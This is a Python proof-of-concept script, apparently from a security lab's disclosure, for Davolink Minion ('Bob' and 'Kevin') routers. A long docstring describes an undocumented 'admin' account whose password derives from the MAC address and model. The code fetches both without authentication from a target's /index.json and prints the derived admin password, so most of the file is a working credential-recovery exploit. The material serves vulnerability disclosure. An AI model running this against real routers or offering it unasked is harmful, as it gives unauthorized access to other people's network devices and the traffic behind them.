#!/usr/bin/python3

import argparse
import hashlib
import json
import requests

headers = dict()
headers["Connection"] = "keep-alive"
headers["Upgrade-Insecure-Requests"] = "1"
headers["User-Agent"] = "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Raspbian Chromium/78.0.3904.108 Chrome/78.0.3904.108 Safari/537.36"
headers["Sec-Fetch-User"] = "?1"
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
headers["Sec-Fetch-Site"] = "none"
headers["Sec-Fetch-Mode"] = "navigate"
headers["Accept-Encoding"] = "gzip, deflate, br"
headers["Accept-Language"] = "en-US,en;q=0.9"
headers["Content-Type"] = "application/json"

'''
The Davolink "Bob" and "Kevin" Minion routers were found to have an account
with username `admin` that is not described in customer documentation. Unlike
the `bob` account, which has `/dev/null` as its default shell and therefore
cannot log in, the `admin` account has `/bin/dvsh` as its default shell, and
can log in over SSH to this restricted maintenance interface if "remote
support" is enabled. Note that the `admin` account can log into the web
interface regardless of whether "remote support" is enabled, and can
therefore trigger any vulnerabilities in that interface at any time, as well
as enable the SSH interface if the web interface can be reached. This brings
Scorpion Labs to consider this vulnerability significant as there is no
indication in the user interface that the `admin` account exists, much less a
mechanism by which to change its password. As a concluding notion: when
"remote support" is enabled the router will attempt a VPN connection to an IP
address presently listed as located in South Korea, and the web user interface
warns the user not to leave this interface enabled, sustaining the notion that
this account is connected to manufacturer assistance.

The default password for the `admin` user is set deterministically from a
handful of factors including the router's default MAC address, model type, and
the device's role in the manufacturer/consumer relationship (i.e. for
business-to-consumer products the acronym "B2C" will appear in the password
generation scheme). The precise generation scheme goes as follows:
  1. Take the router's default MAC address (this appears in /index.json)
  2. Convert the MAC address to all upper-case and remove all instances of
     byte-separators such as colons or dashes
       (i.e. 01:23:45:67:89:ab -> 0123456789AB)
  3. Append the model type without special characters such as hyphenation
       (`DVW642` for "Bob" and `DVW632` for "Kevin"- it is unknown if other
        SmartAir routers such as the DVW-614o include the lower-case
        "o" character suffix, or if it is upper-cased;
        i.e. 0123456789AB -> 0123456789ABDVW642)
  4. A single character is appended to this string. In testing only the
     character `X` has been observed, but testing was limited to the "Kevin"
     and "Bob" routers. This may be related to the SmartAir model number
     mentioned in {3} above.
       (i.e. 0123456789ABDVW642 -> 0123456789ABDVW642X)
  5. An acronym representing the manufacturer/consumer relationship is
     appended to this string. In testing only the acronym "B2C" was observed,
     but this may be because only the "Kevin" and "Bob" routers were tested.
     It is possible other acronyms such as B2I ("business-to-Individual") or
     DTC ("Direct-To-Consumer") are also used.
       (i.e. 0123456789ABDVW642X -> 0123456789ABDVW642XB2C)
  6. The md5 hash of this string is taken and its hex digest taken as a
     string kept in lower-case:
       (i.e. 0123456789ABDVW642XB2C -> 45d843d55454ec2688b8d397c9305464)
  7. This string is truncated to ten characters. This is the `admin` password:
       (i.e. 45d843d55454ec2688b8d397c9305464 -> 45d843d554)
                                                 ^^^^^^^^^^

Though presently untested, it is possible that this scheme exists in other
products in Davolink's SmartAir small-office/home-office product line.
'''
def get_device_details(address, port, ssl):
    '''
    Obtains device-specific information pre-authentication.

    address  -- the IP address of the remote Minion target
    port     -- the port of the target's administrative web console
    ssl      -- true if requests are to use SSL (or port 8443)

    Returns:
    MAC address and Model type (complete = false)
    exception/exit (failure)
    '''
    try:
        if ssl:
            device_info = requests.get(
                "https://" + address + ":" + port + "/index.json",
                headers = headers,
                verify = False)
        else:
            device_info = requests.get(
                "http://" + address + ":" + port + "/index.json",
                headers = headers)

        if device_info.status_code == 200:
            info_as_json = json.loads(device_info.content)
            return info_as_json["data"]["mac"], info_as_json["data"]["model"]
        else:
            print("Got a " + str(result) + ". Something went wrong.")
            exit(2)

    except Exception as e:
        print("Something went wrong: %s" % (str(e)))

def evaluate_default_admin_password(mac, model, letter, role):
    '''
    Calculates a Davolink Minion router's default admin user password.

    Keyword Arguments:
    mac    -- the MAC address of the target device
    model  -- the "model" ID of the target device
    letter -- a letter possibly -likely- associated with the model
    role   -- an acronym representing the device's business purpose

    Returns:
    The password for the 'admin' user
    '''
    keystring = mac.replace(":", "").replace("-", "").upper()

    keystring += model.replace("-", "").upper()

    keystring += letter + role

    return hashlib.md5(keystring.encode("ascii")).hexdigest().lower()[:10]

def main():
    parser = argparse.ArgumentParser(
        description="Generate admin user password.",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "-a",
        "--address",
        help = "IP address of target 'bob' (required without MAC address")
    parser.add_argument(
        "-o",
        "--port",
        default = "80",
        help = "Port the remote web server is found on (default: 80)")
    parser.add_argument(
        "-s",
        "--ssl",
        action = "store_true",
        help = "Use SSL when making requests (default: false)")
    parser.add_argument(
        "-m",
        "--mac",
        help = "MAC address of target Minion (defaults to /index.json value")
    parser.add_argument(
        "-M",
        "--model",
        help = "model ID of target Minion (defaults to /index.json value)")
    parser.add_argument(
        "-l",
        "--letter",
        default = "X",
        help = "letter of unknown meaning (default: 'X'; seen in testing )")
    parser.add_argument(
        "-r",
        "--role",
        default = "B2C",
        help = "business role of product (default: 'B2C'; seen in testing )")
    parser.add_argument(
        "-d",
        "--display",
        action = "store_true",
        help = "Display the results in stdout (default: false)")
    parser.add_argument(
        "-v",
        "--verbose",
        action = "store_true",
        help = "increase output verbosity (currently not implemented)")

    args = parser.parse_args()

    if not args.mac or not args.model:
        if not args.address:
            print("MAC and model or Web connection details must be supplied.")
            exit(1)
        else:
            address = args.address
            port = args.port
            ssl = args.ssl
            mac, model = get_device_details(address, port, ssl)
    else:
        mac = args.mac
        model = args.model

    letter = args.letter
    role = args.role
    display = args.display

    password = evaluate_default_admin_password(mac, model, letter, role)

    if display:
        print(password)

    exit(0)

if __name__ == "__main__":
    main()
